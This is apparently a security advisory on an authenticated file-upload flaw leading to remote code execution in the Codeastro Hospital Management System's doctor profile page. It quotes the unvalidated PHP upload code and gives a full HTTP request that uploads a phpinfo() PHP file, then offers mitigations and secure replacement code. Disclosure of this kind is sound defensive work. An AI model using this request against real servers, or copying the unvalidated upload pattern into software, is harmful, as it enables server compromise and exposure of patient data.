## Vulnerability Details:
- **Application Name**: Codeastro Hospital Management System (HMS) 
- **Software Link**: [Download Link](https://codeastro.com/hospital-management-system-in-php-with-source-code-adv/)
- **Vendor Homepage**: [Vendor Homepage](https://codeastro.com/)
- **BuG**: Arbitrary Authenticated File Upload Leading to Remote Code Execution (RCE)
- **BUG_Author**: egsec

## About project:
In particular, this Hospital Management System Project in PHP focuses mainly on managing medical-related records within the hospital. To be more precise, the system helps to keep track of medical reports. Also, the system displays all the available employees and patients. In addition, the system allows adding up inventories, and pharmacy records too(codeastro.com). Evidently, this project contains an admin panel with an employee/doctor panel. In an overview of this web application, a doctor can simply log into the system using his/her doctor id and password. He/she can manage patients, pharmacy, and laboratory records. Additionally, the employee/doctor can view and manage inventories too. With it, the system also allows the user to view detailed information and reports of each patient. Besides, the users can update their profiles too.

## Vulnerability Description:
The file upload functionality at the endpoint `/his_doc_update-account.php` in the HMS (Hospital Management System) application allows users to upload files without proper validation. An attacker can exploit this vulnerability to upload a malicious PHP file, potentially enabling remote code execution (RCE) on the server.

## Vulnerable Code Section:
`/his_doc_update-account.php`:
```php
<?php
...
$doc_dpic=$_FILES["doc_dpic"]["name"];
move_uploaded_file($_FILES["doc_dpic"]["tmp_name"],"assets/images/users/".$_FILES["doc_dpic"]["name"]);
...
?>
```
- The code does not check whether the uploaded file is an image or any other type of file (e.g., PHP script).
- Attackers can upload files like malicious.php that might contain executable PHP code.

## Proof of Concept (PoC):
- create malicious php file like `code.php`
- write in the file this payload in order to execute the commands: `<?php phpinfo();?>`
- go to the `/his_doc_update-account.php` for browsing malicous file

vulnerable page:
![pocpage](https://github.com/user-attachments/assets/4a592a91-f782-49d4-9c25-024ac90bedfc)

request:
```python
POST /Hospital-PHP/backend/doc/his_doc_update-account.php HTTP/1.1
Host: localhost
Content-Length: 609
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryASLhlqV2ooCKl78K
User-Agent: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/Hospital-PHP/backend/doc/his_doc_update-account.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ii5mujqdm7ch6qa08j70t843ki
Connection: close

------WebKitFormBoundaryASLhlqV2ooCKl78K
Content-Disposition: form-data; name="doc_fname"


------WebKitFormBoundaryASLhlqV2ooCKl78K
Content-Disposition: form-data; name="doc_lname"


------WebKitFormBoundaryASLhlqV2ooCKl78K
Content-Disposition: form-data; name="doc_email"


------WebKitFormBoundaryASLhlqV2ooCKl78K
Content-Disposition: form-data; name="doc_dpic"; filename="code.php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>

------WebKitFormBoundaryASLhlqV2ooCKl78K
Content-Disposition: form-data; name="update_profile"


------WebKitFormBoundaryASLhlqV2ooCKl78K--
```

- after uploading, you will get the alert like success (200 OK):

![req2](https://github.com/user-attachments/assets/95a4c55f-5cb2-4c61-91ed-eb0ce94e4456)

- request the malicous file (http://localhost/Hospital-PHP/backend/doc/assets/images/users/code.php):

![image](https://github.com/user-attachments/assets/a7b4f6ee-1a1b-4206-88e9-aaacda00a948)

[PoC video link](https://www.youtube.com/watch?v=roWqcKTSjL0)

## Impact:
This vulnerability allows attackers to upload and execute arbitrary code on the server. The consequences of successful exploitation include:

    Unauthorized remote code execution on the server
    Potential access to sensitive system information or data
    Compromise of the server and other connected systems
    Escalation of privileges, depending on the attacker’s access level

## Mitigation:
1. Restrict Allowed File Types.
   Use the mime_content_type() or pathinfo() functions to check that the uploaded file is an image.
2. Rename Uploaded Files.
   Generate a random name for the uploaded file to avoid potential exploits through file names.
3. Store Files Outside the Web Root.
   Store uploaded files in a directory that is not directly accessible via the browser, e.g., uploads/ outside the public directory.
4. Use a Whitelist-Based MIME Type Validation.
   Verify that the uploaded file has an appropriate MIME type.

##### secure code:
```php
<?php
if (isset($_FILES["doc_dpic"])) {
    $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
    $upload_dir = '/var/www/uploads/'; // Directory outside web root
    $file_extension = pathinfo($_FILES["doc_dpic"]["name"], PATHINFO_EXTENSION);
    $doc_dpic = uniqid() . '.' . $file_extension;

    // Validate file type and extension
    if (!in_array(strtolower($file_extension), $allowed_extensions)) {
        die("Error: Only image files are allowed.");
    }

    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime_type = finfo_file($finfo, $_FILES["doc_dpic"]["tmp_name"]);
    finfo_close($finfo);

    $allowed_mime_types = ['image/jpeg', 'image/png', 'image/gif'];
    if (!in_array($mime_type, $allowed_mime_types)) {
        die("Error: Invalid file type.");
    }

    // Move the uploaded file to a safe directory
    if (!move_uploaded_file($_FILES["doc_dpic"]["tmp_name"], $upload_dir . $doc_dpic)) {
        die("Error: File upload failed.");
    }
}
?>
```


